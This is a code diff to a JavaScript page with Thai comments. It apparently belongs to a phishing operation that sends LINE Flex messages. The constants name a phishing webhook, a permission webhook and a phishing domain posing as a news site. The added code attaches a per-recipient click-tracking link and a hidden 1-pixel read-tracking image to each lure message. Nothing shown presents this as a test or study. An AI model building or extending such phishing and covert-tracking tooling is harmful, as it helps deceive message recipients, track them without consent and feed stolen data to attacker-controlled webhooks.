@@ -741,8 +741,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxZ7Cv1a-8AWk2d5Se0_wIm9ZAzIYZ9MmNJgUd84tIb3JutxMF3qB4ZCYmtdkjyUprf/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxZ7Cv1a-8AWk2d5Se0_wIm9ZAzIYZ9MmNJgUd84tIb3JutxMF3qB4ZCYmtdkjyUprf/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1453,7 +1453,10 @@
                 // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
-                // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
+                // เพิ่ม URL สำหรับติดตามการอ่านข้อความ
+                const readTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=read`;
+                
+                // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้และรูปภาพติดตามการอ่าน (invisible)
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`,
@@ -1469,6 +1472,22 @@
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
+                        },
+                        footer: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    type: 'image',
+                                    url: readTrackUrl,
+                                    size: '1px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover'
+                                }
+                            ],
+                            spacing: 'none',
+                            margin: 'none',
+                            height: '1px'
                         }
                     }
                 };
